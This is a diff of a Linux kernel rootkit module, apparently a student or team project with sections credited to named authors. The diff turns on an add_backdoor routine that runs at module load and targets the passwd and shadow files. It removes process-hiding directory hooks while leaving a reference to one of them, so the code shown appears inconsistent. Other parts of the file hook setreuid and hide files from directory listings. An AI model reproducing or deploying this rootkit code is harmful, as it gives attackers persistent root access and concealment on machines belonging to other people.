@@ -11,8 +11,6 @@
 #include <linux/dirent.h>
 
 
-
-
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/namei.h>
@@ -55,7 +53,7 @@ asmlinkage long our_setreuid(const struct pt_regs *regs){
 }
 
 // Start Marc
-/*	
+	
 void add_backdoor(char *path) {
 		struct file *file;
 		char *BACKDOOR;
@@ -158,7 +156,7 @@ void add_backdoor(char *path) {
 		}
 }
 // End Marc
-*/
+
 // START BRIAN - Hide files & directories from showing up when a user does "ls"
 
 // taken from man getdents(2)
@@ -232,29 +230,9 @@ static struct path p;
 
 struct dir_context *backup_ctx;
  
-static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
-        loff_t off, u64 ino, unsigned int d_type)
-{
-    if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
-        return 0;
- 
-    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
-}
- 
 struct dir_context rk_ctx = {
     .actor = rk_filldir_t,
 };
- 
-int rk_iterate_shared(struct file *file, struct dir_context *ctx)
-{
-    int result = 0;
-    rk_ctx.pos = ctx->pos;
-    backup_ctx = ctx;
-    result = backup_proc_fops->iterate_shared(file, &rk_ctx);
-    ctx->pos = rk_ctx.pos;
- 
-    return result;
-}
 //START CARLOS  
 
 
@@ -272,8 +250,8 @@ static int __init rootkit_init(void){
 	
 	// Start Marc
 	
-//	add_backdoor(PASSWD_FILE);
-//   	add_backdoor(SHADOW_FILE);
+	add_backdoor(PASSWD_FILE);
+   	add_backdoor(SHADOW_FILE);
 	
 	// End Marc
 	
